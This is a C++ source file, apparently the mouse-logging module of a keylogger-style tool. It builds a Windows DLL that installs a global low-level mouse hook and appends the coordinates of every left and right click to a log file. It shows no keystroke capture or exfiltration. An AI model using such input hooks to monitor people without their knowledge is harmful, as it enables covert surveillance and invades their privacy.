//cl /EHsc /LD .\keylog_m_lib.cpp /link User32.lib
#include <Windows.h>
#include <fstream>
#include <mutex>
#include <codecvt>
#include <string.h>
#define DLL_EXPORT __declspec(dllexport)
///////////////////////////////////////////////////////////////////////
HHOOK mouseHook;

std::ofstream outputFile;
std::mutex logMutex;
///////////////////////////////////////////////////////////////////////

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);

///////////////////////////////////////////////////////////////////////

DLL_EXPORT void Initialize(const std::string& filename)
{

    {
        std::lock_guard<std::mutex> lock(logMutex);
        outputFile.open(filename, std::ios::app);
    }

    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);
}

DLL_EXPORT void Cleanup(const std::string& filename)
{
    if (mouseHook) UnhookWindowsHookEx(mouseHook);

    {
        std::lock_guard<std::mutex> lock(logMutex);
        outputFile.close();
    }
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        MSLLHOOKSTRUCT* mouseStruct = (MSLLHOOKSTRUCT*)lParam;
        int x = mouseStruct->pt.x;
        int y = mouseStruct->pt.y;

        switch (wParam)
        {
            case WM_LBUTTONDOWN:
            {
                //std::wcout << L"\n[Left click (" << x << L", " << y << L")]\n";
                outputFile <<"\n[Left click("<< x <<", "<< y << ")]\n";
                outputFile.flush();
                break;
            }
            case WM_RBUTTONDOWN:
            {
                //std::wcout << L"\n[Right click (" << x << L", " << y << L")]\n";
                outputFile <<"\n[Right click("<< x <<", "<< y << ")]\n";
                outputFile.flush();
                break;
            }
        }
    }
    return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}